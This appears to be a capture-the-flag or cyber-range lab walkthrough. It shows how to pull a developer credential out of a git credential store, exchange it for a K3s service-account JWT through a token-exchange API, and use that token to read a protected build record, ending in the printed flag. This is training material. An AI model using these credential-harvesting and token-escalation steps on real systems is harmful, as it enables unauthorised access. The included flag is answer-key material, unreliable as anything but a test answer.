# K13.4 Walkthrough: Workload identity exchange

The participant exchanges the developer credential for a real K3s service-account
token (`svc-fieldlink-workload`) and reads the protected build record. K3s RBAC
scopes the token.

## Step 0: open a participant shell

```
gcloud compute ssh <range-vm> --project prod-mgau4w --zone us-central1-a --tunnel-through-iap
sudo docker exec -it --user rowan cinder-keplerops-k-dev bash
```

## Step 1: set up the developer credential

The developer token is specific to each range. Read it from the git credential
store instead of copying a fixed value.

```
CA=~/.local/share/keplerops/ca.crt
DEV=$(sed -E 's#https://([^@]+)@.*#\1#' ~/.config/git/credentials)
```

`$DEV` is `rowan.ito:fk_developer_<...>`.

## Step 2: read the workspace exchange (GET)

```
curl -sS --cacert $CA -u "$DEV" \
  https://cloud-api.keplerops.test/api/workspaces/current/token-exchange
```

The response has `fixture_token`, `trust_record` (TRUST-FLX-04), `namespace`, and
`workload_sa` (svc-fieldlink-workload).

## Step 3: issue the workload service-account token (POST)

The POST mints a real K3s JWT for `svc-fieldlink-workload`. Capture it.

```
WORKLOAD=$(curl -sS --cacert $CA -u "$DEV" \
  -H 'Content-Type: application/json' -d '{}' \
  https://cloud-api.keplerops.test/api/workspaces/current/token-exchange \
  | grep -o '"access_token":"[^"]*"' | cut -d'"' -f4)
echo "$WORKLOAD"
```

`$WORKLOAD` starts with `eyJ` (a JWT). Its K3s subject is
`system:serviceaccount:fieldlink:svc-fieldlink-workload`.

## Step 4: read the build record (K13.4 acceptance check)

```
curl -sS --cacert $CA -H "Authorization: Bearer $WORKLOAD" \
  https://cloud-api.keplerops.test/api/build-records/BLD-1842
```

Output:

```json
{"build_id":"BLD-1842","flag":"FLAG{10a79b42b8e652b2}","principal":"svc-fieldlink-workload","schema":"fieldkest.build-record/v1","scope":"fieldkest-build-records","version":"2026-09-18","workspace":"fieldlink-workload"}
```
